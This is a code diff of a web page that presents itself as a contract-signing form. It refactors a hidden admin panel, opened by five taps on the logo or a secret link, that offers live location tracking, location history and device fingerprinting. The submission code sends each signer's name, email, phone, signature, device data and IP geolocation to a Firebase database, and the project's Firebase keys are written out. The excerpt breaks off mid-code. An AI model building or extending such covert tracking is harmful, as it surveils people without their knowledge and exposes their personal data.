@@ -350,7 +350,6 @@
             <div class="tab-button active" data-tab="tracking">Contract Signings</div>
             <div class="tab-button" data-tab="analytics">Live Tracking</div>
             <div class="tab-button" data-tab="history">Location History</div>
-            <div class="tab-button" data-tab="export">Export Evidence</div>
         </div>
         
         <div id="trackingTab" class="tab-content active">
@@ -365,15 +364,8 @@
                 <span id="accuracy">Accuracy: --</span> | 
                 <span id="lastUpdate">Last: Never</span>
             </div>
-            <button id="startTracking" style="background: #2563eb; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin-right: 10px;">
-                Start Live Tracking
-            </button>
-            <button id="stopTracking" style="background: #dc2626; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin-right: 10px;">
-                Stop Tracking
-            </button>
-            <button id="screenshot" style="background: #059669; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer;">
-                Capture Page Screenshot
-            </button>
+            <button id="startTracking" class="btn btn-primary">Start Live Tracking</button>
+            <button id="stopTracking" class="btn btn-secondary">Stop Tracking</button>
             
             <h3 style="margin-top: 30px;">Device Fingerprint</h3>
             <div id="devicePrint" style="font-size: 12px; word-break: break-all; background: #1e293b; padding: 15px; border-radius: 4px; margin-top: 10px;"></div>
@@ -385,29 +377,7 @@
                 No location history available. Start tracking to record locations.
             </div>
             <div style="margin-top: 15px;">
-                <button id="clearHistory" style="background: #dc2626; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer;">
-                    Clear History
-                </button>
-                <button id="exportHistory" style="background: #2563eb; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin-left: 10px;">
-                    Export History
-                </button>
-            </div>
-        </div>
-        
-        <div id="exportTab" class="tab-content">
-            <h3>Export Forensic Evidence</h3>
-            <div style="margin-top: 20px;">
-                <button id="exportPDF" style="background: #2563eb; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin-right: 10px;">
-                    Export as PDF Report
-                </button>
-                <button id="exportCSV" style="background: #059669; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer;">
-                    Export Raw Data (CSV)
-                </button>
-            </div>
-            <div style="margin-top: 20px;">
-                <label style="display: block; margin-bottom: 8px;">Date Range:</label>
-                <input type="date" id="startDate" style="margin-right: 10px; background: #1e293b; color: white; border: 1px solid #334155; padding: 8px; border-radius: 4px;">
-                <input type="date" id="endDate" style="background: #1e293b; color: white; border: 1px solid #334155; padding: 8px; border-radius: 4px;">
+                <button id="clearHistory" class="btn btn-secondary">Clear History</button>
             </div>
         </div>
     </div>
@@ -430,102 +400,93 @@
         const firebaseConfig = {
             apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
             authDomain: "gps-d0bab.firebaseapp.com",
+            databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
             projectId: "gps-d0bab",
             storageBucket: "gps-d0bab.appspot.com",
             messagingSenderId: "810816177909",
-            appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
+            appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc",
+            measurementId: "G-5EX9DF2QKH"
         };
 
         // Initialize Firebase
         let db;
         try {
-            // Initialize Firebase
             const app = firebase.initializeApp(firebaseConfig);
             db = firebase.firestore();
-            
             console.log("Firebase initialized successfully");
             
             // Enable offline persistence
             db.enablePersistence()
                 .catch(err => {
                     console.warn("Persistence error:", err);
-                    if (err.code == 'failed-precondition') {
-                        console.warn("Multiple tabs open, persistence can only be enabled in one tab at a time.");
-                    } else if (err.code == 'unimplemented') {
-                        console.warn("The current browser does not support all of the features required to enable persistence");
-                    }
                 });
         } catch (error) {
             console.error("Firebase initialization error:", error);
             alert("Error initializing database connection. Please refresh the page.");
         }
 
-        // ===== SIGNATURE PAD =====
-        let signaturePad;
-        function initSignaturePad() {
+        // ===== MAIN APPLICATION =====
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initialize signature pad
             const canvas = document.getElementById('signatureCanvas');
-            if (canvas) {
-                signaturePad = new SignaturePad(canvas, {
-                    backgroundColor: 'white',
-                    penColor: 'black'
-                });
-                
-                document.getElementById('clearSignature').addEventListener('click', (e) => {
-                    e.preventDefault();
-                    signaturePad.clear();
-                });
-            }
-        }
-
-        // ===== ADMIN PANEL FUNCTIONALITY =====
-        let adminPanelVisible = false;
-        let tapCount = 0;
-        let locationHistory = [];
-
-        function toggleAdminPanel(e) {
-            if (e) e.preventDefault();
-            adminPanelVisible = !adminPanelVisible;
+            const signaturePad = new SignaturePad(canvas, {
+                backgroundColor: 'white',
+                penColor: 'black'
+            });
             
-            if (adminPanelVisible) {
-                document.body.style.overflow = 'hidden';
-                document.getElementById('adminPanel').style.display = 'block';
-                loadTrackingData();
-                initAnalytics();
-            } else {
-                document.body.style.overflow = '';
-                document.getElementById('adminPanel').style.display = 'none';
-                if (window.watchId) {
-                    stopTracking();
+            document.getElementById('clearSignature').addEventListener('click', (e) => {
+                e.preventDefault();
+                signaturePad.clear();
+            });
+
+            // Set contract date
+            document.getElementById('contractDate').textContent = new Date().toLocaleDateString();
+            
+            // ===== ADMIN PANEL FUNCTIONALITY =====
+            let adminPanelVisible = false;
+            let tapCount = 0;
+            let locationHistory = [];
+            let watchId = null;
+
+            // Toggle admin panel
+            function toggleAdminPanel(e) {
+                if (e) e.preventDefault();
+                adminPanelVisible = !adminPanelVisible;
+                
+                if (adminPanelVisible) {
+                    document.body.style.overflow = 'hidden';
+                    document.getElementById('adminPanel').style.display = 'block';
+                    loadTrackingData();
+                    initAnalytics();
+                } else {
+                    document.body.style.overflow = '';
+                    document.getElementById('adminPanel').style.display = 'none';
+                    if (watchId) {
+                        stopTracking();
+                    }
                 }
             }
-        }
 
-        function handleLogoClick(e) {
-            e.preventDefault();
-            tapCount++;
-            
-            if (tapCount === 5) {
-                toggleAdminPanel();
-                tapCount = 0;
-            }
-            
-            clearTimeout(window.tapTimeout);
-            window.tapTimeout = setTimeout(() => tapCount = 0, 2000);
-        }
+            // Logo multi-tap detection
+            document.getElementById('adminLogo').addEventListener('click', function(e) {
+                e.preventDefault();
+                tapCount++;
+                
+                if (tapCount === 5) {
+                    toggleAdminPanel();
+                    tapCount = 0;
+                }
+                
+                clearTimeout(window.tapTimeout);
+                window.tapTimeout = setTimeout(() => tapCount = 0, 2000);
+            });
 
-        function setupAdminPanel() {
-            const adminLogo = document.getElementById('adminLogo');
-            const secretAdminLink = document.getElementById('secretAdminLink');
-            const adminClose = document.getElementById('adminClose');
+            // Secret admin link
+            document.getElementById('secretAdminLink').addEventListener('click', toggleAdminPanel);
             
-            if (adminLogo) {
-                adminLogo.addEventListener('click', handleLogoClick);
-                adminLogo.addEventListener('touchstart', handleLogoClick);
-            }
-            
-            if (secretAdminLink) secretAdminLink.addEventListener('click', toggleAdminPanel);
-            if (adminClose) adminClose.addEventListener('click', toggleAdminPanel);
-            
+            // Close admin panel
+            document.getElementById('adminClose').addEventListener('click', toggleAdminPanel);
+
             // Tab switching
             document.querySelectorAll('.tab-button').forEach(button => {
                 button.addEventListener('click', (e) => {
@@ -534,4 +495,59 @@
                     // Remove active class from all buttons and content
                     document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
                     document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
-    
+                    
+                    // Add active class to clicked button
+                    button.classList.add('active');
+                    
+                    // Show corresponding content
+                    const tabId = button.getAttribute('data-tab') + 'Tab';
+                    document.getElementById(tabId).classList.add('active');
+                });
+            });
+
+            // ===== FORM SUBMISSION =====
+            document.getElementById('submitContract').addEventListener('click', async function(e) {
+                e.preventDefault();
+                
+                // Validate form
+                if (signaturePad.isEmpty()) {
+                    alert("Please provide your signature");
+                    return;
+                }
+                
+                if (!document.getElementById('agreeTerms').checked) {
+                    alert("Please agree to the terms and conditions");
+                    return;
+                }
+                
+                const fullName = document.getElementById('fullName').value.trim();
+                const email = document.getElementById('email').value.trim();
+                const phone = document.getElementById('phone').value.trim();
+                
+                if (!fullName || !email || !phone) {
+                    alert("Please fill in all required fields");
+                    return;
+                }
+
+                // Show loading overlay
+                document.getElementById('loadingOverlay').style.display = 'flex';
+                
+                try {
+                    const contractData = {
+                        timestamp: new Date().toISOString(),
+                        name: fullName,
+                        email: email,
+                        phone: phone,
+                        signature: signaturePad.toDataURL(),
+                        device: getDeviceInfo(),
+                        location: {}
+                    };
+
+                    // Get IP-based location
+                    try {
+                        const ipResponse = await fetch('https://ipapi.co/json/');
+                        if (ipResponse.ok) {
+                            const ipData = await ipResponse.json();
+                            contractData.location.ipData = {
+                                ip: ipData.ip,
+                                   
